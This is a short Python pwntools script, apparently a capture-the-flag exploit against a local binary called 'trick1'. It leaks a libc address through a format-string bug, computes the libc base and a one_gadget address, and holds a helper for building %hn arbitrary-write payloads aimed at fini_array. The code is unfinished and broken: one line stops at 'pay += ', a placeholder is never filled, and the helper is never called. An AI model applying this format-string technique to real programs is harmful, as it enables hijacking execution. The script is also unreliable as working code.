#!/usr/bin/python 
from pwn import *
#from koharin import *

p = process("./trick1")
elf = ELF("./trick1")
libc = elf.libc
fini_array = 0x600898

def fmt64(offset, addr, value):
    pay = ''
    prev = 0
    for i in range(3):
        target = (value >> (i*16)) & 0xffff
        if prev < target:
            pay += '%{}c'.format(target-prev)
        elif prev > target:
            pay += '%{}c'.format(0x10000 + target - prev)
        pay += '%xx$hn'
        prev = target
        pay += 
#one_gadget_offset = get_oneshot('l')

pay = ''
pay += '%' + str(6 + 0x118/8) + '$p'

p.send(pay)

leak = int(p.recv(14), 16)
libcBase = leak - (libc.symbols['__libc_start_main'] + 240)
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + 0x45216



p.interactive()


